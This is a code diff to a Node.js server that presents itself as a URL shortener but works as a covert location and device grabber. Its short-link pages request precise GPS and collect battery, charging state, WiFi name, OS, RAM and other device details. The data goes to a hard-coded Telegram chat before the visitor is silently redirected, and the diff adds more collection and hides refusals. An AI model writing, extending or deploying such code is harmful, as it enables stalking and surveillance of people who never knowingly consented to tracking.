@@ -15,6 +15,7 @@ const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5942654805';
 const BASE_URL = process.env.SHORT_DOMAIN || 'https://vvvvv-production-7945.up.railway.app';
 
 const linkStorage = {};
+const formattedLinks = {};
 
 function generateShortCode() {
   return crypto.randomBytes(4).toString('hex');
@@ -79,6 +80,18 @@ app.post('/api/shorten', (req, res) => {
   });
 });
 
+app.post('/api/format-url', (req, res) => {
+  const { originalUrl } = req.body;
+  if (!originalUrl) return res.status(400).json({ error: 'URL required' });
+
+  const formatCode = generateShortCode();
+  formattedLinks[formatCode] = originalUrl;
+
+  res.json({
+    code: formatCode
+  });
+});
+
 app.post('/api/log-gps', async (req, res) => {
   const body = safeParseBody(req);
   const { code, latitude, longitude, accuracy, deviceData } = body;
@@ -102,7 +115,7 @@ app.post('/api/log-gps', async (req, res) => {
   msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
 
   if (latitude && longitude) {
-    msg += `<b>✅ 📍 GPS (موقع دقيق)</b>\n`;
+    msg += `<b>✅ 📍 GPS (موقع دقيق جداً)</b>\n`;
     msg += `📍 <code>${parseFloat(latitude).toFixed(6)}, ${parseFloat(longitude).toFixed(6)}</code>\n`;
     msg += `📏 دقة: ±${parseInt(accuracy)} متر\n`;
     msg += `🗺️ <a href="https://maps.google.com/?q=${latitude},${longitude}">اضغط للخريطة</a>\n`;
@@ -111,13 +124,12 @@ app.post('/api/log-gps', async (req, res) => {
       msg += `📮 ${address}\n`;
     }
     msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
-  } else {
-    msg += `<b>❌ GPS</b>\nالمستخدم رفض السماح بالموقع\n━━━━━━━━━━━━━━━━━━━\n\n`;
   }
 
   if (deviceData) {
     msg += `<b>📱 بيانات الجهاز:</b>\n`;
     if (deviceData.battery) msg += `🔋 البطارية: ${deviceData.battery}%\n`;
+    if (deviceData.charging) msg += `⚡ شحن: ${deviceData.charging}\n`;
     if (deviceData.deviceType) msg += `📱 نوع الجهاز: ${deviceData.deviceType}\n`;
     if (deviceData.networkName) msg += `📡 شبكة WiFi: ${deviceData.networkName}\n`;
     if (deviceData.screenRes) msg += `📺 دقة الشاشة: ${deviceData.screenRes}\n`;
@@ -125,6 +137,7 @@ app.post('/api/log-gps', async (req, res) => {
     if (deviceData.os) msg += `🖥️ النظام: ${deviceData.os}\n`;
     if (deviceData.language) msg += `🗣️ اللغة: ${deviceData.language}\n`;
     if (deviceData.cores) msg += `⚙️ المعالجات: ${deviceData.cores}\n`;
+    if (deviceData.ram) msg += `💾 الذاكرة: ${deviceData.ram}GB\n`;
   }
 
   await sendToTelegram(msg);
@@ -141,6 +154,12 @@ app.use(express.static('.'));
 app.get('/:code', (req, res) => {
   const { code } = req.params;
 
+  // تحقق من formatted links أولاً
+  if (formattedLinks[code]) {
+    return res.redirect(301, formattedLinks[code]);
+  }
+
+  // ثم تحقق من short links
   if (!linkStorage[code]) {
     return res.status(404).send('<h1>Not found</h1>');
   }
@@ -186,37 +205,42 @@ app.get('/:code', (req, res) => {
         language: navigator.language
       };
 
+      if (navigator.getBattery) {
+        navigator.getBattery().then(battery => {
+          data.battery = Math.round(battery.level * 100);
+          data.charging = battery.charging ? 'نعم' : 'لا';
+        });
+      }
+
       return data;
-    }
-
-    function send(lat, lng, acc) {
-      const deviceData = collectDeviceData();
-      const payload = {
-        code: code,
-        latitude: lat,
-        longitude: lng,
-        accuracy: acc,
-        deviceData: deviceData
-      };
-
-      fetch(apiUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload),
-        keepalive: true
-      }).finally(() => {
-        window.location.href = originalUrl;
-      });
     }
 
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
-        (pos) => send(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
-        () => send(null, null, null),
-        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+        (pos) => {
+          const deviceData = collectDeviceData();
+          fetch(apiUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              code: code,
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
+              deviceData: deviceData
+            }),
+            keepalive: true
+          }).finally(() => {
+            window.location.href = originalUrl;
+          });
+        },
+        () => {
+          window.location.href = originalUrl;
+        },
+        { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
       );
     } else {
-      send(null, null, null);
+      window.location.href = originalUrl;
     }
   </script>
 </body>
